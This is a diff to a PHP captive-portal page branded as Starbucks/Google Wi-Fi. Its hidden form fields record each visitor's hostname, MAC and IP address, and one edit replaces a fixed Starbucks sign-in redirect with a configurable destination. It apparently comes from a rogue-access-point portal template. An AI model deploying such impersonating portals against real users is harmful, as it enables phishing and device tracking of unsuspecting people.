@@ -143,7 +143,7 @@ require_once('helper.php');
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="https://www.starbucks.com/account/signin">
+            <input type="hidden" name="target" value="<?=$destination?>">
             <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Accept &amp; Connect</button>
             <div class="text-center terms-text1">I agree to the <a href="#" class="url-color" id="btn1">Terms of Service</a> and have</div>
             <div class="text-center terms-text2"> reviewed the <a href="#" class="url-color">Google Privacy Policy</a></div>
@@ -190,7 +190,7 @@ The Service is made available provided:
   </div>
 
     <script src='/static/js/jquery.min.js'></script>
-    <script src="/static/js/index.js"></script> 
+    <script src="/static/js/index.js"></script>
 <script>
 // Get the modal
 var modal = document.getElementById('myModal');
@@ -201,7 +201,7 @@ var btn = document.getElementById("btn1");
 // Get the <span> element that closes the modal
 var span = document.getElementsByClassName("close")[0];
 
-// When the user clicks the button, open the modal 
+// When the user clicks the button, open the modal
 btn.onclick = function() {
     modal.style.display = "block";
 }
